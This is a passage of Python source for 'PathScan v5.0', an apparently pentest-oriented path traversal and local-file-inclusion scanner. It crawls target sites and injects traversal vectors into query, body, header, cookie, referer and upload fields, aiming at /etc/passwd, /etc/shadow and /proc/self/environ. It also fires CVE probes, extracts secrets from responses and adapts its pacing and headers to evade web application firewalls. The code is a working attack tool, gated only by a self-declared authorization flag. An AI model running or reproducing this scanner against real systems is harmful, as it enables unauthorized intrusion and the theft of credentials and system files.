            self._cnt[domain] += 1
            self._delay[domain] = min(2**self._cnt[domain]*0.4, 30.0)
            return self._delay[domain]

    def ok(self, domain):
        with self._lock:
            self._cnt[domain]   = max(0, self._cnt[domain]-1)
            self._delay[domain] = max(0.0, self._delay[domain]*0.7)

    def get(self, domain):
        with self._lock:
            return self._delay[domain]

_backoff = BackoffMgr()
_waf_detected: dict = {}


# ─────────────────────────────────────────────────────────────────────────────
# HTTP REQUEST WRAPPER
# ─────────────────────────────────────────────────────────────────────────────
def _req(session, method, url, extra_hdrs=None, timing=False, **kwargs):
    """
    Single request with:
    • Random UA per call
    • Anti-WAF stealth headers
    • Per-domain smart backoff on 429/503
    • 3-attempt exponential retry
    • Optional timing measurement for blind oracle
    """
    domain = urlparse(url).netloc
    d = _backoff.get(domain)
    if d > 0:
        time.sleep(d)

    hdrs = dict(STEALTH_HEADERS)
    hdrs["User-Agent"] = random.choice(USER_AGENTS)
    if extra_hdrs:
        hdrs.update(extra_hdrs)
    if "headers" in kwargs:
        hdrs.update(kwargs.pop("headers"))

    t0 = time.monotonic() if timing else None

    for attempt in range(3):
        try:
            resp = session.request(method, url, headers=hdrs,
                                   timeout=12, verify=False,
                                   allow_redirects=True, **kwargs)
            # WAF detection
            hstr = " ".join(f"{k}:{v}" for k,v in resp.headers.items()).lower()
            bstr = resp.text[:300].lower()
            for waf, sigs in WAF_SIGS.items():
                if any(s.lower() in hstr or s.lower() in bstr for s in sigs):
                    if domain not in _waf_detected:
                        _waf_detected[domain] = waf
                        warn(f"WAF detected: {waf} on {domain} — adapting pacing")
                    break

            if resp.status_code in (429, 503):
                delay = _backoff.block(domain)
                warn(f"Rate-limited on {domain} — backing off {delay:.1f}s")
                time.sleep(delay)
                continue
            elif resp.status_code == 403:
                _backoff.block(domain)
            else:
                _backoff.ok(domain)

            elapsed = (time.monotonic()-t0) if timing else None
            return resp, elapsed
        except requests.RequestException as e:
            if attempt == 2:
                return None, None
            time.sleep(2**attempt)
    return None, None


# ─────────────────────────────────────────────────────────────────────────────
# RESULT STORE + DEDUP
# ─────────────────────────────────────────────────────────────────────────────
class Store:
    def __init__(self):
        self._lock = threading.Lock()
        self.findings = []
        self._seen = set()

    def add(self, f):
        key = hashlib.md5(
            f"{f['url']}|{f['parameter']}|{f['payload_class']}".encode()
        ).hexdigest()
        with self._lock:
            if key in self._seen:
                return False
            self._seen.add(key); self.findings.append(f); return True

_store = Store()


# ─────────────────────────────────────────────────────────────────────────────
# CHECKPOINT (resume support)
# ─────────────────────────────────────────────────────────────────────────────
class Checkpoint:
    def __init__(self, path):
        self.path = path
        self._lock = threading.Lock()
        self._done = set()
        if path and os.path.exists(path):
            try:
                self._done = set(json.load(open(path)).get("done",[]))
                info(f"Checkpoint: {len(self._done)} items already done")
            except Exception:
                pass

    def is_done(self, key):
        return key in self._done

    def mark(self, key):
        with self._lock:
            self._done.add(key)
            if self.path:
                try:
                    json.dump({"done":list(self._done)}, open(self.path,"w"))
                except Exception:
                    pass

    @staticmethod
    def key(url, loc, param, vec):
        return hashlib.md5(f"{url}|{loc}|{param}|{vec}".encode()).hexdigest()

_ckpt = Checkpoint(None)  # replaced by main()


# ─────────────────────────────────────────────────────────────────────────────
# CORE INJECTION + VERIFICATION
# ─────────────────────────────────────────────────────────────────────────────
def _inject(session, base_url, location, param, pl, orig="", blind_timing=False):
    vector = pl["vector"]
    ck = Checkpoint.key(base_url, location, param, vector)
    if _ckpt.is_done(ck):
        return

    parsed = urlparse(base_url)
    target = base_url; kwargs = {}; method = "GET"

    if location == "query":
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [vector]
        target = urlunparse((parsed.scheme,parsed.netloc,parsed.path,
                             parsed.params,urlencode(qs,doseq=True),""))
    elif location == "body":
        method="POST"; kwargs["data"]={param:vector}
    elif location == "json":
        method="POST"; kwargs["json"]={param:vector}
        kwargs["headers"]={"Content-Type":"application/json"}
    elif location == "header":
        kwargs["headers"]={param:vector}
    elif location == "cookie":
        kwargs["cookies"]={param:vector}
    elif location == "referer":
        kwargs["headers"]={"Referer":f"{parsed.scheme}://{parsed.netloc}/{vector}"}
    elif location == "route":
        target = re.sub(rf"\{{{re.escape(param)}\}}", vector, base_url)
    elif location == "multipart":
        method="POST"
        kwargs["files"]={param:(vector, b"PATHSCAN","application/octet-stream")}

    resp, elapsed = _req(session, method, target, timing=blind_timing, **kwargs)
    _ckpt.mark(ck)
    if not resp:
        return

    # Error oracle
    sig = error_oracle(resp.text)
    if sig:
        disc(f"{base_url} | {param} | {sig!r:.80}")

    # Tier-1 byte check
    t1, t1sig = tier1_check(resp.content)

    # Blind timing oracle (LOW confidence)
    timing_hit = blind_timing and elapsed is not None and elapsed > 4.5

    if not t1 and not timing_hit:
        return

    # Tier-2 secret extraction
    secrets = tier2_extract(resp.text) if t1 else []

    conf = "HIGH" if t1 else "LOW"
    sev  = "CRITICAL" if secrets else ("HIGH" if t1 else "MEDIUM")

    finding = {
        "timestamp":     datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC"),
        "url":           base_url,
        "target_url":    target,
        "method":        method,
        "location":      location,
        "parameter":     param,
        "payload_class": f"Class {pl['cls']}",
        "class_name":    pl["cls_name"],
        "payload":       vector,
        "os_target":     pl.get("os","any"),
        "confidence":    conf,
        "tier1_match":   t1sig.decode(errors="replace") if t1sig else ("TIMING" if timing_hit else ""),
        "timing_delta":  f"{elapsed:.2f}s" if elapsed else "",
        "secrets":       [{"type":s[0],"value":s[1]} for s in secrets],
        "status_code":   resp.status_code,
        "response_size": len(resp.content),
        "severity":      sev,
        "cve":           pl.get("cve",""),
    }

    if _store.add(finding):
        hit("="*62)
        hit(f"  Target     : {target}")
        hit(f"  Surface    : {location} → {param}")
        hit(f"  Payload    : {vector[:80]}")
        hit(f"  Class      : Class {pl['cls']} — {pl['cls_name']}")
        hit(f"  Confidence : {conf} | Severity: {sev}")
        if t1sig:
            hit(f"  Tier-1 Hit : {t1sig!r:.80}")
        if timing_hit:
            hit(f"  Timing     : {elapsed:.2f}s (blind oracle)")
        for s in secrets:
            hit(f"  SECRET [{s['type']}]: {s['value'][:80]}")
        hit("="*62)


# ─────────────────────────────────────────────────────────────────────────────
# CVE PROBE RUNNER
# ─────────────────────────────────────────────────────────────────────────────
def run_cves(session, base_url):
    parsed = urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    probes = _build_cve_probes(origin)
    info(f"Running {len(probes)} CVE probes against {origin}")

    for p in probes:
        kwargs = {}
        if p["body"]:    kwargs["data"]    = p["body"]
        if p["headers"]: kwargs["headers"] = p["headers"]
        resp, _ = _req(session, p["method"], p["url"], **kwargs)
        if not resp:
            continue
        try:
            matched = p["verify"](resp)
        except Exception:
            matched = False
        if not matched:
            continue

        t1, t1sig = tier1_check(resp.content)
        secrets = tier2_extract(resp.text) if t1 else []

        f = {
            "timestamp":     datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC"),
            "url":           base_url,
            "target_url":    p["url"],
            "method":        p["method"],
            "location":      "cve_probe",
            "parameter":     "path",
            "payload_class": "CVE Probe",
            "class_name":    p["desc"],
            "payload":       p["url"].replace(origin,""),
            "os_target":     "any",
            "confidence":    "HIGH",
            "tier1_match":   t1sig.decode(errors="replace") if t1sig else "(verify fn matched)",
            "timing_delta":  "",
            "secrets":       [{"type":s[0],"value":s[1]} for s in secrets],
            "status_code":   resp.status_code,
            "response_size": len(resp.content),
            "severity":      "CRITICAL",
            "cve":           p["cve"],
        }
        if _store.add(f):
            hit("="*62)
            hit(f"  CVE        : {p['cve']}")
            hit(f"  Desc       : {p['desc']}")
            hit(f"  URL        : {p['url']}")
            hit(f"  Status     : {resp.status_code} | Size: {len(resp.content)}")
            for s in secrets:
                hit(f"  SECRET [{s['type']}]: {s['value'][:80]}")
            hit("="*62)


# ─────────────────────────────────────────────────────────────────────────────
# CRAWLER — discovers links, forms, JS routes automatically
# ─────────────────────────────────────────────────────────────────────────────
def crawl(session, seed, max_pages=80):
    visited = set(); q = queue.Queue(); q.put(seed)
    found = []; seed_domain = urlparse(seed).netloc

    while not q.empty() and len(visited) < max_pages:
        url = q.get()
        if url in visited: continue
        visited.add(url)
        if urlparse(url).netloc != seed_domain: continue

        resp, _ = _req(session, "GET", url)
        if not resp: continue
        ct = resp.headers.get("Content-Type","")
        if not ("html" in ct or "javascript" in ct): continue
        text = resp.text

        # Links + src
        for m in re.finditer(r'(?:href|src|action)=["\']([^"\']+)["\']',text,re.I):
            abs_u = urljoin(url, m.group(1))
            if urlparse(abs_u).netloc == seed_domain and abs_u not in visited:
                q.put(abs_u)
            if "?" in abs_u:
                found.append(abs_u)

        # Forms
        for fm in re.finditer(
            r'<form[^>]*(?:method=["\']?(\w+)["\']?)?[^>]*'
            r'(?:action=["\']?([^"\'> ]+)["\']?)?[^>]*>(.*?)</form>',
            text, re.I|re.S):
            method  = (fm.group(1) or "GET").upper()
            action  = fm.group(2) or url
            body    = fm.group(3)
            fu = urljoin(url, action)
            if urlparse(fu).netloc != seed_domain: continue
            names = re.findall(r'name=["\']([^"\']+)["\']',body,re.I)
            if names:
                qs = urlencode({n:"test" for n in names})
                found.append(f"{fu}?{qs}" if method=="GET" else fu)

        # JS: fetch/axios calls + quoted paths with query strings
        for path in re.finditer(
            r"""(?:fetch|axios\.(?:get|post)|http\.get)\s*\(\s*['"`]([^'"`]+)['"`]""",
            text):
            abs_u = urljoin(url, path.group(1))
            if urlparse(abs_u).netloc == seed_domain:
                found.append(abs_u)

        for path in re.finditer(r"""['"`](/[a-zA-Z0-9/_\-\.?=&%]+)['"`]""", text):
            if "?" in path.group(1):
                abs_u = urljoin(url, path.group(1))
                if urlparse(abs_u).netloc == seed_domain:
                    found.append(abs_u)

    info(f"Crawl: {len(visited)} pages → {len(set(found))} injectable URLs found")
    return list(set(found))


# ─────────────────────────────────────────────────────────────────────────────
# OPENAPI / SWAGGER PARSER
# ─────────────────────────────────────────────────────────────────────────────
def parse_openapi(path, base_url):
    eps = []
    try:
        with open(path) as f:
            spec = json.load(f)
        parsed = urlparse(base_url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        base_path = spec.get("basePath","")
        for route, methods in spec.get("paths",{}).items():
            for method, op in methods.items():
                if method.lower() not in ("get","post","put","patch","delete"):
                    continue
                loc_map = {"query":"query","path":"route",
                           "formData":"body","body":"json"}
                for p in op.get("parameters",[]):
                    loc = loc_map.get(p.get("in","query"),"query")
                    eps.append({
                        "url":    origin + base_path + route,
                        "params": [p.get("name","")],
                        "method": method.upper(),
                        "location": loc,
                        "source": "openapi",
                    })
        good(f"OpenAPI: {len(eps)} endpoint×param pairs loaded from {path}")
    except Exception as e:
        err(f"OpenAPI parse error: {e}")
    return eps


# ─────────────────────────────────────────────────────────────────────────────
# ENDPOINT FUZZER — all surfaces for one endpoint dict
# ─────────────────────────────────────────────────────────────────────────────
def fuzz(session, ep, force_append=False, blind_timing=False):
    url      = ep["url"]
    location = ep.get("location","query")
    method   = ep.get("method","GET")
    parsed   = urlparse(url)
    params   = parse_qs(parsed.query, keep_blank_values=True)

    if not params and force_append:
        for fp in FORCE_PARAMS:
            params[fp] = ["test"]

    # ── A: query / body / json params ─────────────────────────────────────────
    for param, vals in params.items():
        orig = vals[0] if vals else ""
        is_file = (param.lower() in FILE_PARAM_KEYWORDS or
                   any(k in param.lower() for k in FILE_PARAM_KEYWORDS))

        for pl in ALL_PAYLOADS:
            if not is_file and pl["cls"] in ("10","B-2","6","11"):
                continue
            _inject(session, url, location, param, pl, orig, blind_timing)

        # ── Class 11 DYNAMIC: detect prefix from original param value ──────────
        # e.g. filename=/var/www/images/1.jpg  →  detect /var/www/images as base
        if orig and orig.startswith("/") and "." in orig.split("/")[-1]:
            detected_base = posixpath.dirname(orig)  # /var/www/images
            depth = detected_base.count("/")
            for ed in range(1, depth+4):
                esc = "../"  * ed
                enc = "..%2F"* ed
                dbl = "..%252F"*ed
                for tgt in ["etc/passwd","etc/shadow","etc/hosts","proc/self/environ"]:
                    for vec,desc in [
                        (detected_base+"/"+esc+tgt, f"Class 11 Auto-detected ({detected_base})"),
                        (detected_base+"/"+enc+tgt, f"Class 11 Auto URL-encoded ({detected_base})"),
                        (detected_base+"/"+dbl+tgt, f"Class 11 Auto double-enc ({detected_base})"),
                    ]:
                        _inject(session, url, "query", param,
                                {"vector":vec,"cls":"11","cls_name":desc,"os":"linux"},
                                orig, blind_timing)
                    for ext in [".jpg",".png",".gif"]:
                        _inject(session, url, "query", param,
                                {"vector":detected_base+"/"+esc+tgt+"%00"+ext,
                                 "cls":"11","cls_name":f"Class 11+10 Auto ({detected_base})","os":"linux"},
                                orig, blind_timing)

    # ── B: route params {id} ──────────────────────────────────────────────────
    for rp in re.findall(r"\{([a-zA-Z0-9_\-]+)\}", url):
        for pl in ALL_PAYLOADS[:40]:
            _inject(session, url, "route", rp, pl, "", blind_timing)

    # ── C: high-risk injection headers ────────────────────────────────────────
    for hdr in ["X-File-Path","X-Local-File","X-Forwarded-File","X-Include-File",
                "Template-Name","X-Template-Path","X-Original-URL","X-Rewrite-URL",
                "X-Sendfile","X-Accel-Redirect","X-Content-Source"]:
        for pl in ALL_PAYLOADS[:20]:
            _inject(session, url, "header", hdr, pl, "", blind_timing)

    # ── D: Referer-based traversal ────────────────────────────────────────────
    for pl in ALL_PAYLOADS[:15]:
        _inject(session, url, "referer", "Referer", pl, "", blind_timing)

    # ── E: multipart upload fuzzing (POST only) ───────────────────────────────
    if method == "POST":
        for param in list(params.keys())[:5]:
            for pl in ALL_PAYLOADS[:25]:
                _inject(session, url, "multipart", param, pl, "", blind_timing)

    # ── F: cookie injection ───────────────────────────────────────────────────
    for param in list(params.keys()):
        if any(k in param.lower() for k in FILE_PARAM_KEYWORDS):
            for pl in ALL_PAYLOADS[:15]:
                _inject(session, url, "cookie", param, pl, "", blind_timing)


# ─────────────────────────────────────────────────────────────────────────────
# URL NORMALIZER
# ─────────────────────────────────────────────────────────────────────────────
def normalize(urls):
    seen = set(); out = []
    for u in urls:
        u = u.strip()
        if not u or u.startswith("#"): continue
        if not u.startswith(("http://","https://")):
            u = "https://"+u
        if u not in seen:
            seen.add(u); out.append(u)
    return out


# ─────────────────────────────────────────────────────────────────────────────
# REPORT WRITERS
# ─────────────────────────────────────────────────────────────────────────────
def _ord(f): return {"CRITICAL":0,"HIGH":1,"MEDIUM":2}.get(f["severity"],3)

def write_json(findings, path):
    c = sum(1 for f in findings if f["severity"]=="CRITICAL")
    h = sum(1 for f in findings if f["severity"]=="HIGH")
    json.dump({"tool":"PathScan v5.0",
               "generated":datetime.now(timezone.utc).isoformat(),
               "summary":{"total":len(findings),"critical":c,"high":h},
               "findings":sorted(findings,key=_ord)},
              open(path,"w"), indent=2)
    good(f"JSON report → {path}")

def write_markdown(findings, path, domain):
    sf  = sorted(findings, key=_ord)
    now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    c = sum(1 for f in findings if f["severity"]=="CRITICAL")
    h = sum(1 for f in findings if f["severity"]=="HIGH")
    with open(path,"w") as f:
        f.write(f"# PathScan v5.0 — Path Traversal / LFI Report\n\n")
        f.write(f"**Target:** `{domain}`  \n**Generated:** {now}  \n")
        f.write(f"**Findings:** {len(findings)} (CRITICAL:{c} HIGH:{h})\n\n---\n\n")
        if not findings:
            f.write("## ✅ No confirmed vulnerabilities.\n"); return
        f.write("## Summary\n\n| # | Severity | Conf | CVE | Class | Parameter | Path |\n")
        f.write("|---|---|---|---|---|---|---|\n")
        for i,v in enumerate(sf,1):
            ep = urlparse(v["url"]).path or "/"
            f.write(f"| {i} | **{v['severity']}** | {v['confidence']} "
                    f"| {v.get('cve','—')} | {v['payload_class']} "
                    f"| `{v['parameter']}` | `{ep}` |\n")
        f.write("\n---\n\n## Detailed Findings\n\n")
        for i,v in enumerate(sf,1):
            f.write(f"### Finding #{i} — {v['severity']} — {v['class_name']}\n\n")
            if v.get("cve"): f.write(f"> **CVE:** `{v['cve']}`\n\n")
            f.write(f"- **Surface:** `{v['location']}` → `{v['parameter']}`\n")
            f.write(f"- **Payload Class:** {v['payload_class']}\n")
            f.write(f"- **Confidence:** {v['confidence']}\n")
            f.write(f"- **Tier-1 Match:** `{v['tier1_match']}`\n\n")
            pr = urlparse(v["target_url"])
            pq = pr.path+("?"+pr.query if pr.query else "")
            f.write("**Reproduction:**\n\n```http\n")
            f.write(f"{v['method']} {pq} HTTP/1.1\nHost: {pr.netloc}\n")
            if v["location"]=="header": f.write(f"{v['parameter']}: {v['payload']}\n")
            elif v["location"] in ("body","json"): f.write(f"\n{v['parameter']}={v['payload']}\n")
            f.write("```\n\n")
            if v.get("secrets"):
                f.write("**Extracted Secrets:**\n\n")
                for s in v["secrets"]:
                    f.write(f"- **{s['type']}:** `{s['value']}`\n")
                f.write("\n")
            f.write("**Remediation:**\n- Validate and canonicalize all file paths server-side.\n")
            f.write("- Use an allowlist of permitted filenames.\n")
            f.write("- Apply principle of least privilege to the web server process.\n")
            if v.get("cve"): f.write(f"- Apply vendor patch for `{v['cve']}` immediately.\n")
            f.write("\n---\n\n")
    good(f"Markdown report → {path}")

def _esc(t): return str(t).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")

def write_html(findings, path, domain):
    sf  = sorted(findings, key=_ord)
    now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    c   = sum(1 for f in findings if f["severity"]=="CRITICAL")
    h   = sum(1 for f in findings if f["severity"]=="HIGH")
    SC  = {"CRITICAL":"#e74c3c","HIGH":"#e67e22","MEDIUM":"#3498db"}
    CI  = {"HIGH":"🔴","MEDIUM":"🟡","LOW":"🔵"}
    rows = ""
    for i,v in enumerate(sf,1):
        sc  = SC.get(v["severity"],"#888")
        pr  = urlparse(v["target_url"])
        pq  = pr.path+("?"+pr.query if pr.query else "")
        req = f"{v['method']} {pq} HTTP/1.1\nHost: {pr.netloc}\n"
        if v["location"]=="header":   req += f"{v['parameter']}: {v['payload']}\n"
        elif v["location"] in ("body","json"): req += f"\n{v['parameter']}={v['payload']}\n"
        cve_b = (f'<span style="background:#8957e5;color:#fff;border-radius:4px;'
                 f'padding:2px 7px;font-size:.7rem">{v["cve"]}</span>' if v.get("cve") else "")
        sec_h = "".join(f'<div style="color:#f39c12;margin:2px 0"><b>{s["type"]}:</b> '
                        f'<code>{_esc(s["value"][:100])}</code></div>'
                        for s in (v.get("secrets") or []))
        rows += f"""
<div style="border:1px solid #30363d;border-radius:8px;margin-bottom:10px;overflow:hidden">
  <div onclick="t('b{i}')" style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;
       padding:11px 15px;cursor:pointer;background:#161b22;user-select:none">
    <span style="background:{sc};color:#fff;border-radius:4px;padding:2px 9px;
          font-size:.76rem;font-weight:700">{v["severity"]}</span>
    {CI.get(v["confidence"],"⚪")} {cve_b}
    <span style="font-size:.88rem">{_esc(v["class_name"][:60])}</span>
    <code style="background:#0d1117;border-radius:3px;padding:1px 6px;font-size:.75rem">
      {v["location"]}:{v["parameter"]}</code>
    <code style="color:#8b949e;font-size:.74rem;margin-left:auto">
      {_esc(urlparse(v["url"]).path)}</code>
  </div>
  <div id="b{i}" style="display:none;padding:15px;border-top:1px solid #30363d">
    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));
         gap:10px;margin-bottom:12px;font-size:.82rem">
      <div style="background:#0d1117;border-radius:5px;padding:8px">
        <b style="color:#8b949e;font-size:.7rem;display:block">CLASS</b>{v["payload_class"]}</div>
      <div style="background:#0d1117;border-radius:5px;padding:8px">
        <b style="color:#8b949e;font-size:.7rem;display:block">STATUS</b>{v["status_code"]}</div>
      <div style="background:#0d1117;border-radius:5px;padding:8px">
        <b style="color:#8b949e;font-size:.7rem;display:block">SIZE</b>{v["response_size"]} B</div>
      <div style="background:#0d1117;border-radius:5px;padding:8px">
        <b style="color:#8b949e;font-size:.7rem;display:block">CONF</b>{v["confidence"]}</div>
      <div style="background:#0d1117;border-radius:5px;padding:8px">
        <b style="color:#8b949e;font-size:.7rem;display:block">OS</b>{v["os_target"]}</div>
    </div>
    <div style="font-size:.73rem;color:#8b949e;text-transform:uppercase;margin-bottom:4px">
      Tier-1 Match</div>
    <pre style="background:#0d1117;border:1px solid #30363d;border-radius:5px;padding:8px 12px;
         font-size:.78rem;overflow-x:auto;color:#79c0ff">{_esc(v["tier1_match"])}</pre>
    {f'<div style="margin:10px 0 4px;font-size:.73rem;color:#8b949e;text-transform:uppercase">Extracted Secrets</div>{sec_h}' if sec_h else ""}
    <div style="font-size:.73rem;color:#8b949e;text-transform:uppercase;margin:10px 0 4px">
      Reproduction</div>
    <pre style="background:#0d1117;border:1px solid #30363d;border-radius:5px;padding:10px 14px;
         font-size:.78rem;overflow-x:auto">{_esc(req)}</pre>
    <div style="font-size:.73rem;color:#8b949e;text-transform:uppercase;margin:10px 0 4px">
      Full URL</div>
    <pre style="background:#0d1117;border:1px solid #30363d;border-radius:5px;padding:8px 12px;
         font-size:.76rem;overflow-x:auto;word-break:break-all">{_esc(v["target_url"])}</pre>
  </div>
</div>"""

    nof = ('<div style="text-align:center;padding:40px;color:#8b949e">'
           '✅ No confirmed vulnerabilities found.</div>') if not findings else ""

    html = f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>PathScan v5.0 — {domain}</title>
<style>*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
background:#0d1117;color:#c9d1d9;padding:22px;line-height:1.6}}
code{{font-family:"JetBrains Mono",monospace}}pre{{white-space:pre-wrap;word-break:break-word}}</style>
</head><body>
<h1 style="font-size:1.5rem;color:#fff;margin-bottom:4px">
  🔍 PathScan v5.0 — Path Traversal / LFI Report</h1>
<div style="color:#8b949e;font-size:.88rem;margin-bottom:18px">
  Target: <b style="color:#c9d1d9">{domain}</b> &nbsp;|&nbsp; {now}</div>
<div style="display:flex;gap:12px;margin-bottom:20px;flex-wrap:wrap">
  <div style="background:#161b22;border:1px solid #30363d;border-radius:8px;padding:12px 20px;text-align:center">
    <div style="font-size:1.8rem;font-weight:700;color:#fff">{len(findings)}</div>
    <div style="font-size:.72rem;color:#8b949e;text-transform:uppercase">Total</div></div>
  <div style="background:#161b22;border:1px solid #30363d;border-radius:8px;padding:12px 20px;text-align:center">
    <div style="font-size:1.8rem;font-weight:700;color:#e74c3c">{c}</div>
    <div style="font-size:.72rem;color:#8b949e;text-transform:uppercase">Critical</div></div>
  <div style="background:#161b22;border:1px solid #30363d;border-radius:8px;padding:12px 20px;text-align:center">
    <div style="font-size:1.8rem;font-weight:700;color:#e67e22">{h}</div>
    <div style="font-size:.72rem;color:#8b949e;text-transform:uppercase">High</div></div>
</div>
{nof}{rows}
<div style="margin-top:24px;font-size:.76rem;color:#8b949e">
  PathScan v5.0 — Authorized use only</div>
<script>function t(id){{var e=document.getElementById(id);
e.style.display=e.style.display==="none"?"block":"none"}}</script>
</body></html>"""
    open(path,"w").write(html)
    good(f"HTML report → {path}")


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
def main():
    global _ckpt
    ap = argparse.ArgumentParser(
        prog="pathscan",
        description="PathScan v5.0 — Professional Path Traversal & LFI Scanner (FINAL)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Single URL (PortSwigger lab)
  python3 DotSlash.py -u "https://LAB-ID.web-security-academy.net" \\
    --cookies "session=TOKEN" --rps 3 -t 3 --i-have-authorization

  # Stdin pipe with recon tools
  cat urls.txt | python3 DotSlash.py -t 20 --i-have-authorization
  gau target.com | python3 DotSlash.py -t 15 --i-have-authorization
  katana -u https://target.com | python3 DotSlash.py --i-have-authorization

  # Bulk list + force-append (no existing params)
  python3 DotSlash.py -l targets.txt --force-append -t 20 \\
    -o results.html --i-have-authorization

  # OpenAPI spec + Burp proxy + resume checkpoint
  python3 DotSlash.py -u https://api.target.com \\
    --openapi swagger.json --proxy http://127.0.0.1:8080 \\
    --checkpoint scan.ckpt -t 5 --i-have-authorization

  # CVE probes only (fast recon pass)
  python3 DotSlash.py -l targets.txt --cve-only --i-have-authorization

  # With blind timing oracle
  python3 DotSlash.py -u "https://target.com/view?file=x" \\
    --blind-timing --i-have-authorization
        """)

    # Input
    ap.add_argument("-u","--url",    help="Single target URL")
    ap.add_argument("-l","--list",   help="File with one URL per line")
    # Behaviour
    ap.add_argument("--force-append",action="store_true",
                    help="Append common file params to bare URLs with no query string")
    ap.add_argument("--cve-only",    action="store_true",
                    help="Run only CVE probes, skip generic fuzzing")
    ap.add_argument("--skip-cve",    action="store_true",
                    help="Skip CVE-specific probes")
    ap.add_argument("--skip-crawl",  action="store_true",
                    help="Skip HTML crawler")
    ap.add_argument("--blind-timing",action="store_true",
                    help="Enable blind timing oracle (>4.5s response = LOW confidence signal)")
    ap.add_argument("--max-pages",   type=int,default=80,
                    help="Max crawler pages (default: 80)")
    ap.add_argument("--checkpoint",  help="Checkpoint file for resume support")
    ap.add_argument("--openapi",     help="Path to OpenAPI/Swagger JSON spec")
    # Performance
    ap.add_argument("-t","--threads",type=int,default=20,
                    help="Thread pool size (default: 20, distributed across hosts)")
    ap.add_argument("--rps",         type=int,default=0,
                    help="Global req/s cap (0=unlimited)")
    # Auth
    ap.add_argument("--cookies",     help='Cookie string: "session=abc; token=xyz"')
    ap.add_argument("--auth",        help='Authorization header (Bearer ...)')
    ap.add_argument("--headers",     help='Extra headers JSON: \'{"X-Api-Key":"abc"}\'')
    ap.add_argument("--proxy",       help="Proxy URL (e.g. http://127.0.0.1:8080)")
    # Output
    ap.add_argument("-o","--output", default="pathscan_report.json",
                    help="Output file — extension controls format: .json/.md/.html")
    ap.add_argument("--out-json",    default="pathscan_report.json")
    ap.add_argument("--out-md",      default="pathscan_report.md")
    ap.add_argument("--out-html",    default="pathscan_report.html")
    # Safety
    ap.add_argument("--i-have-authorization",action="store_true",
                    help="REQUIRED: confirms explicit authorization to test the target(s)")
    args = ap.parse_args()

    if not args.i_have_authorization:
        print("\n[!] AUTHORIZATION REQUIRED\n"
              "    Add --i-have-authorization to confirm you have explicit permission\n"
              "    (in-scope bug bounty / VDP / your own infrastructure).\n"
              "    Unauthorized scanning is illegal.\n", file=sys.stderr)
        sys.exit(1)

    # ── Collect URLs (stdin / file / -u) ──────────────────────────────────────
    raw = []
    if not sys.stdin.isatty():
        raw.extend(sys.stdin.read().splitlines())
    if args.url:  raw.append(args.url)
    if args.list and os.path.exists(args.list):
        raw.extend(open(args.list).read().splitlines())

    urls = normalize(raw)
    if not urls:
        print("[!] No URLs provided. Use -u, -l, or pipe via stdin.", file=sys.stderr)
        sys.exit(1)

    domain = urlparse(urls[0]).netloc

    # ── Checkpoint ────────────────────────────────────────────────────────────
    _ckpt = Checkpoint(args.checkpoint)

    # ── Session ───────────────────────────────────────────────────────────────
    session = requests.Session()
    session.verify = False
    if args.cookies:
        for part in args.cookies.split(";"):
            if "=" in part:
                k,v = part.strip().split("=",1)
                session.cookies.set(k.strip(),v.strip())
    if args.auth:
        session.headers["Authorization"] = args.auth
    if args.proxy:
        session.proxies = {"http":args.proxy,"https":args.proxy}
    if args.headers:
        try: session.headers.update(json.loads(args.headers))
        except Exception: warn("Could not parse --headers JSON")

    # ── RPS throttle lock ─────────────────────────────────────────────────────
    _rps_lock = threading.Lock(); _rps_last = [0.0]
    _rps_d    = 1.0/args.rps if args.rps > 0 else 0

    def _throttle():
        if _rps_d <= 0: return
        with _rps_lock:
            w = _rps_d - (time.monotonic()-_rps_last[0])
            if w > 0: time.sleep(w)
            _rps_last[0] = time.monotonic()

    # ── Crawl ─────────────────────────────────────────────────────────────────
    all_urls = list(urls)
    if not args.skip_crawl and not args.cve_only:
        for seed in urls:
            info(f"Crawling: {seed}")
            all_urls.extend(crawl(session, seed, args.max_pages))
        all_urls = normalize(all_urls)

    # ── OpenAPI ───────────────────────────────────────────────────────────────
    extra_eps = []
    if args.openapi and os.path.exists(args.openapi):
        extra_eps = parse_openapi(args.openapi, urls[0])

    # Build endpoint dicts from discovered URLs
    url_eps = []
    for u in all_urls:
        parsed = urlparse(u)
        params = parse_qs(parsed.query)
        if params or args.force_append:
            url_eps.append({"url":u,"params":list(params.keys()),
                            "method":"GET","location":"query","source":"crawl"})

    all_eps = url_eps + extra_eps

    # Dedup
    seen_eps = set(); unique_eps = []
    for ep in all_eps:
        key = (ep["url"], ep.get("location",""), tuple(sorted(ep.get("params",[]))))
        if key not in seen_eps:
            seen_eps.add(key); unique_eps.append(ep)
    all_eps = unique_eps

    # ── Domain-distributed thread ordering (round-robin across hosts) ──────────
    dg = defaultdict(list)
    for ep in all_eps:
        dg[urlparse(ep["url"]).netloc].append(ep)
    interleaved = []
    iters = [iter(v) for v in dg.values()]
    while iters:
        nxt = []
        for it in iters:
            try: interleaved.append(next(it)); nxt.append(it)
            except StopIteration: pass
        iters = nxt

    info(f"Surface: {len(interleaved)} endpoint sets | "
         f"Payloads: {len(ALL_PAYLOADS)} | Threads: {args.threads}")

    # ── CVE probes ────────────────────────────────────────────────────────────
    if not args.skip_cve:
        seen_origins = set()
        for u in all_urls:
            p = urlparse(u)
            o = f"{p.scheme}://{p.netloc}"
            if o not in seen_origins:
                seen_origins.add(o)
                run_cves(session, u)

    # ── Fuzz engine ───────────────────────────────────────────────────────────
    if not args.cve_only:
        done = [0]; lock = threading.Lock(); total = len(interleaved)

        def _task(ep):
            _throttle()
            fuzz(session, ep, args.force_append, args.blind_timing)

